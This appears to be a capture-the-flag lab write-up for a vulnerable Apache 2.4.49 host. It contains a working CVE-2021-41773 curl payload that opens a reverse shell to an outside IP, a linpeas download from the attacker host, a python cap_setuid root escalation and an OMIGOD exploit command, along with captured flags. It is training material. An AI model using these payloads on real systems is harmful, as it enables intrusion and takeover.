# Enumeration
## NMAP

```
	# Nmap 7.92 scan initiated Fri Mar  4 13:52:32 2022 as: nmap -vvv -p 22,80 -sCV -oN nmap/initial.md 10.10.75.129
Nmap scan report for 10.10.75.129
Host is up, received syn-ack (0.14s latency).
Scanned at 2022-03-04 13:52:33 UTC for 11s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMlfGBGWZkPg98VnvD+FVeesHsQwmtoJfMOMhifMjxD9AEluFQNVnoyxyQi5y9O2/AN/MO+l57li33lHiVjD1eglBjB3Lkzz3tpRJSmGn2Ug3jRypShkSJ9VkUVFElw8MXke62w3+9pi+S0Ub1DqcttGH8TqihiWvqJbJYnecqjdcka1uKPdPna0gleow9JiaAH3X4EMFdcXZDOGgnOaZId2mEXFDeNNYFZpS+EOcLgXaAp1NobUckE9NXvE73qw+pBNo69m3z4MG7/cJNIsQiFpm5yqgCKJGjhwGFp4zAMXOD23lj1g+iQlwrchwY5nBEHHae1PjQwLjwuWebjWR+bWPalPVYa4d8+15TjjgV8VW/Rac3rTX+A/buyVxUSMhkBtn7fQ2sLoMPPn7vRDo3ggGl5IZaYIvSYRDk9nadsZk+YKUCSgFf97z0PK278vbrPwjJTyyScAnjvs+oLnD/bAdja4uwOOS2CHehjzipVmWf7zR3srIfjZQ4aAUmeh8=
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLf6FvNwGNtpra24lyJ4YWPqB8olwPXhKdr6gSW6Dc+oXdZJbQPtpD7cph3nvR9sQQnTKGiG69XyGKh0ervYI1U=
|   256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEzBDIQu+cp4gApnTbTbtmqljyAcr/Za8goiY57VM+uq
80/tcp open  http    syn-ack Apache httpd 2.4.49 ((Unix))
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- ### Apache version 2.4.49
## Feroxbuster

```
403        7l       20w      199c http://10.10.75.129/.hta
403        7l       20w      199c http://10.10.75.129/.hta.html
403        7l       20w      199c http://10.10.75.129/.hta.txt
403        7l       20w      199c http://10.10.75.129/.hta.php
403        7l       20w      199c http://10.10.75.129/.htpasswd
403        7l       20w      199c http://10.10.75.129/.htpasswd.html
403        7l       20w      199c http://10.10.75.129/.htaccess
403        7l       20w      199c http://10.10.75.129/.htpasswd.txt
403        7l       20w      199c http://10.10.75.129/.htaccess.html
403        7l       20w      199c http://10.10.75.129/.htpasswd.php
403        7l       20w      199c http://10.10.75.129/.htaccess.txt
403        7l       20w      199c http://10.10.75.129/.htaccess.php
200        1l        2w       45c http://10.10.75.129/index.html
403        7l       20w      199c http://10.10.75.129/cgi-bin/
403        7l       20w      199c http://10.10.75.129/cgi-bin/.html

```

- ### /cgi-bin

# Initial Access
[[revshell]]
## CVE-2021-41773/42013

```
curl -v 'http://10.10.75.129/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.14.9.223/1234 0>&1' -H "Content-Type: text/plain"

```
- ### Stablize Shell
```python

python3 -c 'import pty; pty.spawn("/bin/bash")'

Ctrl+z
stty raw -echo; fg
enter (x2)
export TERM=xterm
stty rows (xx) cols (xx)
reset
```
- ### linpeas
	- curl 10.14.9.223:9001/linpeas.sh -o linpeas.sh

	```
	Processes, Cron, Services, Timers & Sockets???
	2320      sed-Es,jdwp|tmux |screen |--inspect|--remote-debugging-port,&,g
	
	Files with capabilities (limited to 50):
	/usr/bin/python3.7 = cap_setuid+ep
	```
    

# Privilege Escalation
## python3.7
- ### GTFOBins [[gtfobins]]
	- Capabilities
		- `python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
- User.txt
	```
	root@4a70924bafa0:/root# cat user.txt
	THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
	```


## Oh-Mi-God 

### exploit found at https://github.com/horizon3ai/CVE-2021-38647
- download omigod.py
- Root.txt
```
root@4a70924bafa0:/tmp# python3 omi.py -t 172.17.0.1 -c "cat /root/root.txt"
THM{7f147ef1f36da9ae29529890a1b6011f}
```